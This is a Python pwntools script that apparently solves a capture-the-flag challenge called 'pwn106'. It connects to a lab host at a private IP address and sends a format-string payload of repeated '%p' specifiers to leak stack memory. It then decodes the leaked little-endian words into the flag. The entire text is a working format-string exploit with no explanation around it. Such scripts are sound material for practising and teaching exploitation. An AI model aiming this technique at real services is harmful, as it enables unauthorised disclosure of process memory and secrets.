from pwn import *

context.binary = e = ELF('./pwn106-user-1644300441063.pwn106-user')
# io = process('./pwn106-user-1644300441063.pwn106-user')
io = remote('10.49.141.124', '9006')

payload = b'%p %p %p %p %p %p %p %p %p %p %p'

io.sendline(payload)
io.recvuntil(b'0x8 ')
io.recvuntil(b'0x8 ')
response = io.recv().strip()

# Remove trailing \n...
strip = b'\n'
raw_flag = response.partition(strip)[0] 
raw_flag = raw_flag.decode('utf-8')

# print(raw_flag)

hex_flag = raw_flag.split()

for x in hex_flag:
    filter = "0x"
    x = x.partition(filter)[2]
    bytes_list = [x[i:i+2] for i in range(0, len(x), 2)]
    fix_endian = ''.join(reversed(bytes_list))
    flag = unhex(fix_endian)
    flag = flag.decode('utf-8')
    print(flag, end='')